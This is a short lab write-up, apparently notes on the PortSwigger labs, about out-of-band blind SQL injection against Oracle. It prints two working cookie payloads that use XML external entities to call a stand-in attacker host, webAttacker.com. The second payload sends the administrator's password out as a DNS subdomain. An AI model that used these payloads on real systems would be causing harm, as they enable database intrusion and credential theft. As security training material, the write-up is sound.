# OUT-of-Band (OAST) Techniques

### Lab15: Blind SQL injection with out-of-band interaction
- An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results.
- In this technique, we will try to make the target server interact with any server we can control and monitor our server to make sure that the target server has sent the request to our server and executed the injected query which we passed into the web application.
- We can use the DNS protocol to perform `DNS lookup` for the domain to resolve it to the IP address.
- Then we will monitor whether the requests succeeded or not.
- Here we will perform a DNS lookup for the domain for any server you control.

```
TrackingId=xyz'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://subdomain.webAttacker.com"> %remote;]>'),'/l') FROM dual)--
```
- If you received responses in your external server since your attack has succeeded. 
- You can read more about [Out-of-band application security testing (OAST)](https://portswigger.net/burp/application-security-testing/oast)
#### `Note:` 
- In `lab15 & lab16`, you will use the `Burp Collaborator client`, but you must have the `Burp Suite professional`.
- But in the real-world scenario, you can use any server you can control.
----------------------------

### Lab16: Blind SQL injection with out-of-band data exfiltration
- We can use the out-of-band channel to exfiltrate data.

```
TrackingId=xyz'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.subdomain.webAttacker.com"> %remote;]>'),'/l') FROM dual)--
```
- The results which our server will receive will be like that: `password`.subdomain.webAttacker.com
